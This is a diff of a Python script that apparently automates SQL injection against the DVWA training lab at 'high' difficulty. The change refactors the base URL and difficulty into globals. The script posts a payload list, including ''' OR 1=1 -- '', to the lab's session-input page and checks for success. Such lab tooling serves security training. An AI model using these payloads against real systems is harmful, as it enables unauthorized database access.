@@ -4,7 +4,10 @@ import requests
 import urllib3
 from bs4 import BeautifulSoup
 
+from conf import BASE_URL
 from util import http_get, http_post
+
+DIFFICULTY = "high"
 
 PAYLOADS = [
     "' OR 1=1 -- ",
@@ -13,26 +16,24 @@ PAYLOADS = [
 
 # -----------------------
 
-def sqli_high(base_url):
-    global PAYLOADS
+def sqli_high():
+    global BASE_URL, DIFFICULTY, PAYLOADS
 
     print("==================================")
-    print("[INFO] - SQLi high")    
-    
-    difficulty = "high"
+    print(f"[INFO] - SQLi {DIFFICULTY}")    
     
     for payload in PAYLOADS:
         # -- request to change app state
-        url = base_url + "/vulnerabilities/sqli/session-input.php"
+        url = BASE_URL + "/vulnerabilities/sqli/session-input.php"
         post_data = f"id={payload}&Submit=Submit"
-        r = http_post(url, difficulty, data=post_data)
+        r = http_post(url, DIFFICULTY, data=post_data)
 
         # -- check if the input triggered an SQLi
-        url = base_url + "/vulnerabilities/sqli/"
-        r = http_get(url, difficulty)
+        url = BASE_URL + "/vulnerabilities/sqli/"
+        r = http_get(url, DIFFICULTY)
+        
         soup = BeautifulSoup(r.text, "html.parser")
         div = soup.find("div", {"class": "vulnerable_code_area"})
-
         if div:
             print("----------------------------------")            
             print(f"[SUCCESS]")
